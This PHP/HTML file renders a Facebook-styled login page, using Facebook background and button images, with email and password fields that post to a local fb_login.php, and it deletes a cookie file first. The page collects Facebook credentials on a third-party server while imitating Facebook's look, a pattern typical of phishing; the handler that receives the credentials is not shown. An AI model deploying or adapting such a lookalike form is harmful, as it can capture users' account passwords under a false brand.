<?php

unlink('mirazmac_cookie.txt');
      //echo '<div align="right">';
      //echo '<form action="fb_login.php" method="post">';
      //echo '<font style="font-family:arial; font-size:9px;">Email or Phone </font><input type="text" name="user" style="font-family:arial; font-size:9px; width: 200px; margin-left: 0px; margin-top: 10px;">';
      //echo '<font style="font-family:arial; font-size:9px;">   Password </font><input type="password" name="password" style="font-family:arial; font-size:9px; width: 200px; margin-left: 0px; margin-top: 10px;">';
      //echo '<input type="submit" value="Log In" style="font-family:arial; font-size:9px; margin-left: 10px; margin-top: 10px;">';
      //echo '</form>'; 
      //echo '</div>';
?>
<style>
html { 
  background: url("facebook.png") no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
div.transbox {
  margin: 30px;
  background-color: #ffffff;
  border: 1px solid black;
  background-color: rgba(0,0,0,.5);
}
</style>

<div class="transbox" align="right">
<div class="dentro" align="left">
  <form action="fb_login.php" method="post">
      <font style="font-family:arial; font-size:9px;">Email or Phone </font><input type="text" name="user" style="font-family:arial; font-size:9px; width: 180px; margin-left: 0px; margin-top: 10px;">
      <p></p>
      <font style="font-family:arial; font-size:9px;">Password </font><input type="password" name="password" style="font-family:arial; font-size:9px; width: 180px; margin-left: 0px; margin-top: 10px;">
      <p></p>
      <input type="image" src="fb.png" style="width:280px;height:105px;">
  </form>
</div>
</div>




